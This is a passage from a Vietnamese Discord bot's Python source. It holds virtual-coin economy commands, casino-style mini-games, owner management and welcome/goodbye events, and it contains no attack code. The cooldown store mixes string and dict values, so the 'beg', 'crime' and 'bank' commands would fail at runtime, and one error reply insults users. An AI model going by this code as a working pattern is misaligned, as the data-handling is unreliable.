@bot.command(name="balance", aliases=["bal", "money", "coin"])
async def balance(ctx, member: discord.Member = None):
    target = member or ctx.author
    coins = get_user_coins(target.id)
    embed = discord.Embed(
        title="💰 TÀI THẢN CỦA BẠN",
        description=f"👤 **Thành viên:** {target.mention}\n💵 **Số coin hiện có:** `{coins:,}` coin",
        color=0xFFD700
    )
    embed.set_thumbnail(url=target.display_avatar.url)
    await ctx.send(embed=embed)

@bot.command(name="daily")
async def daily_reward(ctx):
    uid = str(ctx.author.id)
    now = datetime.now(timezone.utc)
    last = daily_cooldowns.get(uid)
    if last:
        last_time = datetime.fromisoformat(last)
        if (now - last_time) < timedelta(hours=24):
            remaining = timedelta(hours=24) - (now - last_time)
            hours = remaining.seconds // 3600
            minutes = (remaining.seconds % 3600) // 60
            await ctx.send(f"⏳ Bạn đã nhận daily rồi! Vui lòng chờ **{hours}h {minutes}p** nữa.")
            return

    reward = random.randint(500, 2000)
    add_coins(ctx.author.id, reward)
    daily_cooldowns[uid] = now.isoformat()
    save_json(DAILY_FILE, daily_cooldowns)
    embed = discord.Embed(
        title="🎁 PHẦN QUÀ HÀNG NGÀY",
        description=f"🎉 Bạn đã nhận thành công **+{reward:,} coin** điểm danh hôm nay!",
        color=0x00FF00
    )
    embed.set_thumbnail(url=HELP_THUMBNAIL_GIF)
    await ctx.send(embed=embed)

@bot.command(name="work")
async def work_command(ctx):
    jobs = [
        "Lập trình Bot Discord", "Rửa bát thuê", "Đi bán vé số",
        "Chạy Grab xe ôm", "Giao hàng Shopee", "Bán trà đá vỉa hè",
        "Sửa máy tính", "Viết blog", "Edit video", "Chụp ảnh cưới"
    ]
    job = random.choice(jobs)
    earned = random.randint(200, 800)
    add_coins(ctx.author.id, earned)
    embed = discord.Embed(
        title="🛠️ LÀM VIỆC CHĂM CHỈ",
        description=f"💼 Bạn đã làm công việc **{job}** và thu về **+{earned:,} coin**!",
        color=0x00CCFF
    )
    embed.set_thumbnail(url=HELP_THUMBNAIL_GIF)
    await ctx.send(embed=embed)

@bot.command(name="give", aliases=["pay"])
async def give_coins(ctx, member: discord.Member, amount: int):
    if amount <= 0:
        await ctx.send("❌ Số coin chuyển phải lớn hơn 0!")
        return
    if member.id == ctx.author.id:
        await ctx.send("❌ Bạn không thể tự chuyển coin cho chính mình!")
        return
    if not subtract_coins(ctx.author.id, amount):
        await ctx.send("❌ Bạn không có đủ số coin để chuyển!")
        return
    add_coins(member.id, amount)
    embed = discord.Embed(
        title="💸 GIAO DỊCH CHUYỂN COIN",
        description=f"✅ {ctx.author.mention} đã chuyển thành công **{amount:,} coin** cho {member.mention}!",
        color=0x00FF00
    )
    embed.set_thumbnail(url=HELP_THUMBNAIL_GIF)
    await ctx.send(embed=embed)

@bot.command(name="coinflip", aliases=["cf"])
async def coinflip(ctx, bet: int, choice: str):
    if bet <= 0:
        await ctx.send("❌ Số coin cược phải lớn hơn 0!")
        return
    if not subtract_coins(ctx.author.id, bet):
        await ctx.send(f"❌ Bạn không đủ `{bet:,}` coin để cược!")
        return
    choice = choice.lower()
    if choice not in ["h", "t", "ngua", "up"]:
        add_coins(ctx.author.id, bet)
        await ctx.send("❌ Lựa chọn không hợp lệ! Dùng `h` (Ngửa) hoặc `t` (Úp).")
        return

    result = random.choice(["h", "t"])
    res_str = "Ngửa (Head)" if result == "h" else "Úp (Tail)"
    user_choice_str = "Ngửa (Head)" if choice in ["h", "ngua"] else "Úp (Tail)"

    if (choice in ["h", "ngua"] and result == "h") or (choice in ["t", "up"] and result == "t"):
        win = bet * 2
        add_coins(ctx.author.id, win)
        embed = discord.Embed(
            title="🪙 TUNG ĐỒNG XU",
            description=f"🪙 Kết quả: **{res_str}** | Bạn chọn: **{user_choice_str}**\n🎉 **BẠN THẮNG!** Nhận **+{win:,} coin**!",
            color=0x00FF00
        )
        embed.set_thumbnail(url=HELP_THUMBNAIL_GIF)
        await ctx.send(embed=embed)
    else:
        embed = discord.Embed(
            title="🪙 TUNG ĐỒNG XU",
            description=f"🪙 Kết quả: **{res_str}** | Bạn chọn: **{user_choice_str}**\n💀 **BẠN THUA!** Mất **-{bet:,} coin**.",
            color=0xFF0000
        )
        embed.set_thumbnail(url=HELP_THUMBNAIL_GIF)
        await ctx.send(embed=embed)

@bot.command(name="slots")
async def slots(ctx, bet: int):
    if bet <= 0:
        await ctx.send("❌ Số coin cược phải lớn hơn 0!")
        return
    if not subtract_coins(ctx.author.id, bet):
        await ctx.send(f"❌ Bạn không đủ `{bet:,}` coin!")
        return

    emojis = ["🍎", "🍋", "🍒", "🍇", "💎", "7️⃣"]
    s1, s2, s3 = random.choice(emojis), random.choice(emojis), random.choice(emojis)

    msg = f"🎰 **SLOTS MACHINE** 🎰\n| {s1} | {s2} | {s3} |\n"
    if s1 == s2 == s3:
        win = bet * 5
        add_coins(ctx.author.id, win)
        embed = discord.Embed(
            title="🎰 MÁY SLOTS",
            description=msg + f"🔥 **JACKPOT 3/3!** Bạn thắng gấp 5 lần: **+{win:,} coin**!",
            color=0xFFD700
        )
        embed.set_thumbnail(url=HELP_THUMBNAIL_GIF)
        await ctx.send(embed=embed)
    elif s1 == s2 or s2 == s3 or s1 == s3:
        win = bet * 3  # tăng từ x2 lên x3
        add_coins(ctx.author.id, win)
        embed = discord.Embed(
            title="🎰 MÁY SLOTS",
            description=msg + f"🎉 **TRÚNG 2/3!** Bạn thắng **+{win:,} coin**!",
            color=0x00FF00
        )
        embed.set_thumbnail(url=HELP_THUMBNAIL_GIF)
        await ctx.send(embed=embed)
    else:
        embed = discord.Embed(
            title="🎰 MÁY SLOTS",
            description=msg + f"💀 **THUA RỒI!** Bạn mất **-{bet:,} coin**.",
            color=0xFF0000
        )
        embed.set_thumbnail(url=HELP_THUMBNAIL_GIF)
        await ctx.send(embed=embed)

@bot.command(name="rps")
async def rps(ctx, bet: int, choice: str):
    if bet <= 0:
        await ctx.send("❌ Số coin cược phải lớn hơn 0!")
        return
    if not subtract_coins(ctx.author.id, bet):
        await ctx.send(f"❌ Bạn không đủ `{bet:,}` coin!")
        return
    options = {"r": "🪨 Búa", "p": "📄 Bao", "s": "✂️ Kéo"}
    user_c = choice.lower()
    if user_c not in options:
        add_coins(ctx.author.id, bet)
        await ctx.send("❌ Hãy chọn `r` (Búa), `p` (Bao), hoặc `s` (Kéo)!")
        return
    bot_c = random.choice(["r", "p", "s"])
    msg = f"Bạn chọn **{options[user_c]}** 🆚 Bot chọn **{options[bot_c]}**\n"
    if user_c == bot_c:
        add_coins(ctx.author.id, bet)
        embed = discord.Embed(
            title="✂️ KÉO BÚA BAO",
            description=msg + "🤝 **HÒA RỒI!** Đã hoàn lại tiền cược.",
            color=0xFFFF00
        )
        embed.set_thumbnail(url=HELP_THUMBNAIL_GIF)
        await ctx.send(embed=embed)
    elif (user_c == "r" and bot_c == "s") or (user_c == "p" and bot_c == "r") or (user_c == "s" and bot_c == "p"):
        win = bet * 2
        add_coins(ctx.author.id, win)
        embed = discord.Embed(
            title="✂️ KÉO BÚA BAO",
            description=msg + f"🎉 **BẠN THẮNG!** Nhận **+{win:,} coin**!",
            color=0x00FF00
        )
        embed.set_thumbnail(url=HELP_THUMBNAIL_GIF)
        await ctx.send(embed=embed)
    else:
        refund = bet // 2
        add_coins(ctx.author.id, refund)
        embed = discord.Embed(
            title="✂️ KÉO BÚA BAO",
            description=msg + f"💀 **BẠN THUA!** Mất **-{bet:,} coin** nhưng được hoàn lại **+{refund:,} coin**.",
            color=0xFF0000
        )
        embed.set_thumbnail(url=HELP_THUMBNAIL_GIF)
        await ctx.send(embed=embed)

@bot.command(name="dice")
async def dice(ctx, bet: int, guess: int):
    if bet <= 0:
        await ctx.send("❌ Số tiền cược phải lớn hơn 0!")
        return
    if not subtract_coins(ctx.author.id, bet):
        await ctx.send(f"❌ Bạn không đủ {bet:,} coin!")
        return
    if guess < 1 or guess > 6:
        add_coins(ctx.author.id, bet)
        await ctx.send("❌ Hãy đoán số từ 1 đến 6!")
        return
    rolled = random.randint(1, 6)
    if guess == rolled:
        win = bet * 5  # tăng từ x4 lên x5
        add_coins(ctx.author.id, win)
        await ctx.send(f"🎲 Xúc xắc ra **[{rolled}]**! {get_win_msg()} Bạn nhận **+{win:,} coin** 🎉!")
    else:
        await ctx.send(f"🎲 Xúc xắc ra **[{rolled}]**! {get_lose_msg()} Bạn mất **-{bet:,} coin**.")

@bot.command(name="hilo")
async def hilo(ctx, bet: int, choice: str):
    if bet <= 0:
        await ctx.send("❌ Số tiền cược phải lớn hơn 0!")
        return
    if not subtract_coins(ctx.author.id, bet):
        await ctx.send(f"❌ Bạn không đủ {bet:,} coin!")
        return
    choice = choice.lower()
    if choice not in ["h", "l"]:
        add_coins(ctx.author.id, bet)
        await ctx.send("❌ Lựa chọn `h` (Cao hơn 7) hoặc `l` (Thấp hơn 7)!")
        return
    num = random.randint(1, 13)
    msg = f"🎴 Lá bài mở ra là: **[{num}]**\n"
    if (choice == "h" and num > 7) or (choice == "l" and num < 7):
        win = int(bet * 2)  # tăng từ 1.8 lên 2
        add_coins(ctx.author.id, win)
        await ctx.send(msg + f"🎉 **ĐOÁN ĐÚNG!** {get_win_msg()} Bạn nhận **+{win:,} coin**!")
    else:
        await ctx.send(msg + f"💀 **ĐOÁN SAI!** {get_lose_msg()} Bạn mất **-{bet:,} coin**.")

@bot.command(name="crash")
async def crash(ctx, bet: int):
    if bet <= 0:
        await ctx.send("❌ Số tiền cược phải lớn hơn 0!")
        return
    if not subtract_coins(ctx.author.id, bet):
        await ctx.send(f"❌ Bạn không đủ {bet:,} coin!")
        return
    crash_point = round(random.uniform(1.1, 3.5), 2)
    message = await ctx.send("🚀 **TÊN LỬA ĐANG BAY...**\nHệ số hiện tại: **1.0x**")
    current = 1.0
    for _ in range(5):
        await asyncio.sleep(1)
        current = round(current + random.uniform(0.2, 0.5), 2)
        if current >= crash_point:
            await message.edit(content=f"💥 **CRASH!** Tên lửa phát nổ ở **{crash_point}x**! {get_lose_msg()} Bạn mất **-{bet:,} coin**.")
            return
        await message.edit(content=f"🚀 **TÊN LỬA ĐANG BAY...**\nHệ số hiện tại: **{current}x**")
    win = int(bet * current)
    add_coins(ctx.author.id, win)
    await message.edit(content=f"🎯 **BẠN ĐÃ DỪNG LẠI AN TOÀN!** Rút ở **{current}x** và thắng **+{win:,} coin**! {get_win_msg()} 💎")

@bot.command(name="lottery")
async def lottery(ctx, bet: int):
    if bet <= 0:
        await ctx.send("❌ Số tiền cược phải lớn hơn 0!")
        return
    if not subtract_coins(ctx.author.id, bet):
        await ctx.send(f"❌ Bạn không đủ {bet:,} coin!")
        return
    luck = random.randint(1, 100)
    if luck > 75:  # Tăng cơ hội trúng từ 10% lên 25%
        win = bet * 10
        add_coins(ctx.author.id, win)
        await ctx.send(f"🎫 **VÉ SỐ TRÚNG ĐẠI PHÁT!** {get_win_msg()} Bạn nhận x10 = **+{win:,} coin** 🎉🎉🎉!")
    else:
        await ctx.send(f"🎫 **VÉ SỐ CHÚC BẠN MAY MẮN LẦN SAU!** {get_lose_msg()} Mất **-{bet:,} coin**.")

@bot.command(name="blackjack", aliases=["bj"])
async def blackjack(ctx, bet: int):
    if bet <= 0:
        await ctx.send("❌ Số tiền cược phải lớn hơn 0!")
        return
    if not subtract_coins(ctx.author.id, bet):
        await ctx.send(f"❌ Bạn không đủ {bet:,} coin!")
        return
    p_card = random.randint(12, 21)
    b_card = random.randint(15, 21)
    embed = discord.Embed(title="🃏 BÀN CHƠI BLACKJACK 21 🃏", color=0x9B59B6)
    embed.add_field(name="Điểm Của Bạn", value=f"`{p_card} điểm`", inline=True)
    embed.add_field(name="Điểm Của Bot", value=f"`{b_card} điểm`", inline=True)
    if p_card > b_card:
        win = bet * 2
        add_coins(ctx.author.id, win)
        embed.description = f"🎉 **BẠN THẮNG!** {get_win_msg()} Nhận **+{win:,} coin**!"
    elif p_card == b_card:
        add_coins(ctx.author.id, bet)
        embed.description = "🤝 **HÒA!** Hoàn lại tiền cược."
    else:
        embed.description = f"💀 **BẠN THUA!** {get_lose_msg()} Mất **-{bet:,} coin**."
    await ctx.send(embed=embed)

@bot.command(name="beg")
async def beg(ctx):
    user_id = ctx.author.id
    last = daily_cooldowns.get(str(user_id), {}).get("last_beg", 0)
    now = datetime.now().timestamp()
    if now - last < 30:
        await ctx.send(f"⏳ **{ctx.author.display_name}** ơi, vừa xin xong! Hãy chờ **{int(30 - (now - last))} giây** nữa nhé.")
        return
    daily_cooldowns[str(user_id)]["last_beg"] = now
    save_json(DAILY_FILE, daily_cooldowns)
    if random.choice([True, False]):
        earned = random.randint(20, 150)
        add_coins(ctx.author.id, earned)
        await ctx.send(f"🥺 Một người tốt bụng đã cho bạn **+{earned:,} coin** 🪙!")
    else:
        await ctx.send("🤡 Đi chỗ khác xin! Không ai cho bạn đồng nào cả.")

@bot.command(name="crime")
async def crime(ctx):
    user_id = ctx.author.id
    last = daily_cooldowns.get(str(user_id), {}).get("last_crime", 0)
    now = datetime.now().timestamp()
    if now - last < 60:
        await ctx.send(f"🚨 Công an đang tuần tra! Hãy ẩn nấp thêm **{int(60 - (now - last))} giây** nữa.")
        return
    daily_cooldowns[str(user_id)]["last_crime"] = now
    save_json(DAILY_FILE, daily_cooldowns)
    if random.random() < 0.55:
        earned = random.randint(300, 1200)
        add_coins(ctx.author.id, earned)
        await ctx.send(f"🥷 **THÀNH CÔNG!** Bạn trộm tiệm kim hoàn và thu về **+{earned:,} coin** 🔥!")
    else:
        loss = random.randint(100, 500)
        subtract_coins(ctx.author.id, loss)
        await ctx.send(f"🚔 **THẤT BẠI!** Bạn bị cảnh sát bắt và phạt **-{loss:,} coin** 💸!")

@bot.command(name="bank")
async def bank(ctx, action: str = None, amount: str = None):
    uid = str(ctx.author.id)
    if uid not in user_coins:
        user_coins[uid] = 0
        save_json(COIN_FILE, user_coins)
    bal = user_coins.get(uid, 0)
    bank_bal = daily_cooldowns.get(uid, {}).get("bank", 0)
    if not action or action not in ["deposit", "withdraw", "dep", "with"]:
        embed = discord.Embed(
            title="🏦 NGÂN HÀNG CENTRAL BANK 🏦",
            description=f"💵 Tiền mặt: `{bal:,} coin`\n🏦 Tiền gửi: `{bank_bal:,} coin`\n\n👉 **Cú pháp:**\n• `n! bank deposit <số tiền/all>`\n• `n! bank withdraw <số tiền/all>`",
            color=0x00FFCC
        )
        await ctx.send(embed=embed)
        return
    if action in ["deposit", "dep"]:
        amt = bal if amount == "all" else (int(amount) if amount and amount.isdigit() else 0)
        if amt <= 0 or amt > bal:
            await ctx.send("❌ Số tiền gửi không hợp lệ hoặc bạn không đủ tiền mặt!")
            return
        user_coins[uid] -= amt
        daily_cooldowns.setdefault(uid, {})["bank"] = daily_cooldowns[uid].get("bank", 0) + amt
        save_json(COIN_FILE, user_coins)
        save_json(DAILY_FILE, daily_cooldowns)
        await ctx.send(f"🏦 Đã gửi **+{amt:,} coin** vào ngân hàng an toàn! 🔒")
    elif action in ["withdraw", "with"]:
        amt = bank_bal if amount == "all" else (int(amount) if amount and amount.isdigit() else 0)
        if amt <= 0 or amt > bank_bal:
            await ctx.send("❌ Số tiền rút không hợp lệ hoặc tài khoản ngân hàng không đủ!")
            return
        daily_cooldowns[uid]["bank"] -= amt
        user_coins[uid] += amt
        save_json(COIN_FILE, user_coins)
        save_json(DAILY_FILE, daily_cooldowns)
        await ctx.send(f"💸 Đã rút **+{amt:,} coin** từ ngân hàng về ví tiền mặt! 💰")

@bot.command(name="leaderboard", aliases=["top"])
async def leaderboard(ctx):
    sorted_users = sorted(user_coins.items(), key=lambda x: x[1], reverse=True)[:10]
    embed = discord.Embed(title="🏆 BẢNG XẾP HẠNG ĐẠI PHÚ HỒ SERVER 🏆", color=0xFFD700)
    description = ""
    medals = ["🥇", "🥈", "🥉", "4️⃣", "5️⃣", "6️⃣", "7️⃣", "8️⃣", "9️⃣", "🔟"]
    for idx, (uid, coins) in enumerate(sorted_users):
        user = bot.get_user(int(uid))
        name = user.display_name if user else f"User {uid}"
        description += f"{medals[idx]} **{name}** — `{coins:,} coin`\n"
    embed.description = description if description else "Chưa có dữ liệu người chơi!"
    await ctx.send(embed=embed)

@bot.command(name="guithu")
@is_bot_owner()
async def guithu(ctx, member: discord.Member, *, content: str):
    try:
        embed = discord.Embed(
            title="📨 BẠN CÓ MỘT LÁ THƯ MỚI!",
            description=content,
            color=0xFF69B4
        )
        embed.set_author(name=ctx.author.display_name, icon_url=ctx.author.display_avatar.url)
        await member.send(embed=embed)
        await ctx.send(f"✅ Đã gửi thư đến {member.mention}.")
    except discord.Forbidden:
        await ctx.send("❌ Không thể gửi tin nhắn riêng cho người này.")

@bot.command(name="buyrole")
async def buyrole(ctx, *, role_name: str):
    role = discord.utils.get(ctx.guild.roles, name=role_name)
    if not role:
        await ctx.send(f"❌ Không tìm thấy Role tên `{role_name}` trên Server!")
        return
    price = 10000
    if not subtract_coins(ctx.author.id, price):
        await ctx.send(f"❌ Bạn không đủ **{price:,} coin** để mua Role {role.mention}!")
        return
    await ctx.author.add_roles(role)
    await ctx.send(f"🎉 **CHÚC MỪNG!** {ctx.author.mention} đã mua thành công Role {role.mention} với giá **{price:,} coin**!")

@bot.command(name="addowner")
@is_bot_owner()
async def addowner(ctx, target: discord.User):
    if target.id in BOT_OWNERS:
        await ctx.send(f"❌ **{target}** đã là Owner của Boss Bảo rồi!")
        return
    BOT_OWNERS.append(target.id)
    save_all_data()
    await ctx.send(f"✅ Đã thêm **{target}** vào danh sách đồng minh tối cao của Boss Bảo!")

@addowner.error
async def addowner_error(ctx, error):
    if isinstance(error, commands.CheckFailure):
        await ctx.send(' NGU À? CÓ PHẢI BOSS BẢO KHÔNG MÀ SÀI? 🤣🤣🤣😂😂😒')

@bot.command(name="deleteowner")
@is_bot_owner()
async def deleteowner(ctx, target: discord.User):
    if len(BOT_OWNERS) <= 1:
        await ctx.send("🔥 Không thể xóa Owner cuối cùng!")
        return
    if target.id not in BOT_OWNERS:
        await ctx.send(f"❌ Không tìm thấy Owner **{target}**!")
        return
    BOT_OWNERS.remove(target.id)
    save_all_data()
    await ctx.send(f"🗑️ Đã xóa **{target}** khỏi danh sách.")

@deleteowner.error
async def deleteowner_error(ctx, error):
    if isinstance(error, commands.CheckFailure):
        await ctx.send(' NGU À? CÓ PHẢI BOSS BẢO KHÔNG MÀ SÀI? 🤣🤣🤣😂😂😒')

# ==================== CÁC GAME MỚI ====================
@bot.command(name="roulette")
async def roulette(ctx, bet: int, choice: str):
    if bet <= 0:
        await ctx.send("❌ Số tiền cược phải lớn hơn 0!")
        return
    if not subtract_coins(ctx.author.id, bet):
        await ctx.send(f"❌ Bạn không đủ {bet:,} coin!")
        return
    choice = choice.lower()
    if choice in ["red", "black"]:
        win_chance = 0.6  # Tỉ lệ thắng 60%
        if random.random() < win_chance:
            win = bet * 2
            add_coins(ctx.author.id, win)
            await ctx.send(f"🎰 Roulette: màu **{choice}** trúng! Bạn thắng **+{win:,} coin**! 🎉")
        else:
            await ctx.send(f"🎰 Roulette: màu **{choice}** không trúng. Bạn mất **-{bet:,} coin**.")
    elif choice.isdigit() and 1 <= int(choice) <= 36:
        num = int(choice)
        if random.random() < 0.1:  # Tỉ lệ trúng số cụ thể 10%
            win = bet * 10
            add_coins(ctx.author.id, win)
            await ctx.send(f"🎰 Roulette: số **{num}** trúng! Bạn thắng **+{win:,} coin**! 🎉")
        else:
            await ctx.send(f"🎰 Roulette: số **{num}** không trúng. Bạn mất **-{bet:,} coin**.")
    else:
        add_coins(ctx.author.id, bet)
        await ctx.send("❌ Lựa chọn không hợp lệ! Dùng `red`, `black` hoặc số từ 1-36.")

@bot.command(name="guess")
async def guess_number(ctx, bet: int, number: int):
    if bet <= 0:
        await ctx.send("❌ Số tiền cược phải lớn hơn 0!")
        return
    if not subtract_coins(ctx.author.id, bet):
        await ctx.send(f"❌ Bạn không đủ {bet:,} coin!")
        return
    if number < 1 or number > 10:
        add_coins(ctx.author.id, bet)
        await ctx.send("❌ Hãy đoán số từ 1 đến 10!")
        return
    secret = random.randint(1, 10)
    if number == secret:
        win = bet * 5
        add_coins(ctx.author.id, win)
        await ctx.send(f"🎯 Số bí mật là **{secret}**! Bạn đoán đúng! Nhận **+{win:,} coin**! 🎉")
    else:
        await ctx.send(f"🎯 Số bí mật là **{secret}**! Bạn đoán sai. Mất **-{bet:,} coin**.")

@bot.command(name="baccarat")
async def baccarat(ctx, bet: int, choice: str):
    if bet <= 0:
        await ctx.send("❌ Số tiền cược phải lớn hơn 0!")
        return
    if not subtract_coins(ctx.author.id, bet):
        await ctx.send(f"❌ Bạn không đủ {bet:,} coin!")
        return
    choice = choice.lower()
    if choice not in ["player", "banker", "tie"]:
        add_coins(ctx.author.id, bet)
        await ctx.send("❌ Lựa chọn: `player`, `banker`, hoặc `tie`.")
        return
    player = random.randint(0, 9)
    banker = random.randint(0, 9)
    if choice == "player":
        if random.random() < 0.55:  # Player thắng 55%
            win = bet * 2
            add_coins(ctx.author.id, win)
            await ctx.send(f"🃏 Baccarat: Player {player} - Banker {banker}. Player thắng! Nhận **+{win:,} coin**!")
        else:
            await ctx.send(f"🃏 Baccarat: Player {player} - Banker {banker}. Player thua. Mất **-{bet:,} coin**.")
    elif choice == "banker":
        if random.random() < 0.45:  # Banker thắng 45%
            win = bet * 2
            add_coins(ctx.author.id, win)
            await ctx.send(f"🃏 Baccarat: Player {player} - Banker {banker}. Banker thắng! Nhận **+{win:,} coin**!")
        else:
            await ctx.send(f"🃏 Baccarat: Player {player} - Banker {banker}. Banker thua. Mất **-{bet:,} coin**.")
    else:  # tie
        if random.random() < 0.2:  # Hòa 20%
            win = bet * 8
            add_coins(ctx.author.id, win)
            await ctx.send(f"🃏 Baccarat: Player {player} - Banker {banker}. Hòa! Nhận **+{win:,} coin**!")
        else:
            await ctx.send(f"🃏 Baccarat: Player {player} - Banker {banker}. Không hòa. Mất **-{bet:,} coin**.")

# ==================== SỰ KIỆN ====================
@bot.event
async def on_ready():
    print(f"Logged in as {bot.user} (ID: {bot.user.id})")
    print("✨ Bot đã khởi động thành công và sẵn sàng hoạt động!")

@bot.event
async def on_message(message):
    if message.author.bot:
        return

    prefixes = ('n!', 'N!', 'n! ', 'N! ')
    for prefix in prefixes:
        if message.content.lower().startswith(prefix.lower()):
            content_after = message.content[len(prefix):].lstrip()
            if content_after.lower().startswith("nuke"):
                await message.reply("làm gì có lệnh nuke ngáo à")
                return
            break

    await bot.process_commands(message)

    if not message.content.startswith("n!") and not message.content.startswith("N!") and not message.content.startswith("n! ") and not message.content.startswith("N! "):
        exp_gain = random.randint(1, 10)
        old_level = get_user_level(message.author.id)
        new_level = add_exp(message.author.id, exp_gain)
        if new_level > old_level:
            coin_reward = random.randint(50, 200)
            add_coins(message.author.id, coin_reward)
            guild_id = str(message.guild.id)
            if guild_id in SERVER_LEVEL_CHANNELS:
                ch_id = SERVER_LEVEL_CHANNELS[guild_id]
                channel = message.guild.get_channel(ch_id)
                if channel:
                    embed = discord.Embed(
                        title="📈 LEVEL UP!",
                        description=f"🎉 {message.author.mention} vừa lên level **{new_level}**!\n💰 Thưởng **+{coin_reward} coin**!",
                        color=0xFFD700
                    )
                    embed.set_thumbnail(url=message.author.display_avatar.url)
                    embed.set_image(url="https://i.pinimg.com/originals/c3/2c/e0/c32ce0a583261b5a296afc194671a5f9.gif")
                    try:
                        await channel.send(embed=embed)
                    except:
                        pass
            await check_and_assign_level_roles(message.author, new_level)

    if message.content.lower().startswith("nuked"):
        content_without_prefix = message.content[len("nuked "):].strip() if len(message.content) > 5 else ""
        if content_without_prefix == "":
            await message.reply("ơi gì vậy sài lệnh thì cứ nuked + lệnh nha")
        else:
            ctx = await bot.get_context(message)
            if ctx.command is None:
                await message.reply("ơi gì vậy sài lệnh thì cứ nuked + lệnh nha")

    has_owner_mention = False
    if message.mentions:
        for user in message.mentions:
            if user.id in BOT_OWNERS:
                has_owner_mention = True
                break

    if not has_owner_mention:
        content_lower = message.content.lower()
        if "bảo" in content_lower:
            owner_id = BOT_OWNERS[0]
            owner_user = bot.get_user(owner_id)
            if owner_user is None:
                try:
                    owner_user = await bot.fetch_user(owner_id)
                except:
                    owner_user = None
            if owner_user:
                await message.reply(f"{owner_user.mention} ê boss nghe k cs ng gọi kìa")

@bot.event
async def on_member_join(member):
    if member.guild is None:
        return
    embed_log = discord.Embed(title="👋 THÀNH VIÊN MỚI GIA NHẬP", description=f"{member.mention} đã tham gia server.", color=0x00FF00)
    await send_log(member.guild.id, embed_log)

    coin_reward = random.randint(10, 50)
    add_coins(member.id, coin_reward)

    guild_id = str(member.guild.id)
    if guild_id in WELCOME_CHANNELS:
        ch_id = WELCOME_CHANNELS[guild_id]
        channel = member.guild.get_channel(ch_id)
        if channel:
            embed = discord.Embed(
                title="🌈 **CHÀO MỪNG CHÚ BÁO NHỎ ĐẾN VỚI SERVER!** 🌈",
                description=(
                    f"✨ Chào mừng chú báo nhỏ {member.mention} đã gia nhập máy chủ **{member.guild.name}**!\n\n"
                    f"💰 **Thưởng join:** +{coin_reward} coin (tổng: {get_user_coins(member.id)} coin)\n\n"
                    "📌 **Giới thiệu các kênh:** Hãy khám phá đầy đủ các khu vực trò chuyện và giải trí.\n"
                    "📜 **Luật chung:** Luôn tuân thủ nội quy để server ngày càng văn minh nhé!\n\n"
                    "💖 Chúc bạn có những phút giây vui vẻ!"
                ),
                color=0x00FFFF
            )
            embed.set_image(url="https://i.pinimg.com/originals/54/19/c9/5419c9ce3ffade43b2837daa2c96b1d9.gif")
            embed.set_footer(text=f"Thành viên thứ #{member.guild.member_count}")
            await channel.send(embed=embed)

@bot.event
async def on_member_remove(member):
    if member.guild is None:
        return
    embed_log = discord.Embed(title="👋 THÀNH VIÊN RỜI KHỎI SERVER", description=f"{member.mention} đã rời server.", color=0xFF9900)
    await send_log(member.guild.id, embed_log)
    guild_id = str(member.guild.id)
    try:
        dm_embed = discord.Embed(
            title="💔 **TẠM BIỆT BẠN NHÉ!** 💔",
            description=(
                f"😢 Server vô cùng nuối tiếc khi thấy {member.mention} đã rời khỏi **{member.guild.name}**...\n"
                "🍀 Chúc bạn luôn bình an, gặp nhiều may mắn và có một cuộc sống thật vui vẻ, hạnh phúc trên con đường sắp tới! Hẹn gặp lại!"
            ),
            color=0xFF69B4
        )
        dm_embed.set_image(url="https://i.pinimg.com/originals/16/d5/83/16d583a3fd6d356e5a1d5e57b318474c.gif")
        await member.send(embed=dm_embed)
    except:
        pass
    if guild_id in GOODBYE_CHANNELS:
        ch_id = GOODBYE_CHANNELS[guild_id]
        channel = member.guild.get_channel(ch_id)
        if channel:
            embed = discord.Embed(
                title="😢 **TẠM BIỆT THÀNH VIÊN** 😢",
                description=f"Thật sự rất nuối tiếc... Tạm biệt {member.mention}, chúc bạn luôn vui vẻ và có nhiều sức khỏe trên con đường mới!",
                color=0xFF0000
            )
            embed.set_image(url="https://i.pinimg.com/originals/16/d5/83/16d583a3fd6d356e5a1d5e57b318474c.gif")
            await channel.send(embed=embed)

@bot.event
async def on_command_error(ctx, error):
    if isinstance(error, commands.CommandNotFound):
        return
    print(f"[ERROR] {error}")

# ==================== CHẠY BOT ====================
if __name__ == "__main__":
    keep_alive()
    if DISCORD_TOKEN:
        bot.run(DISCORD_TOKEN)
    else:
        print("❌ Lỗi: Chưa cấu hình TOKEN trong Environment Variables!")
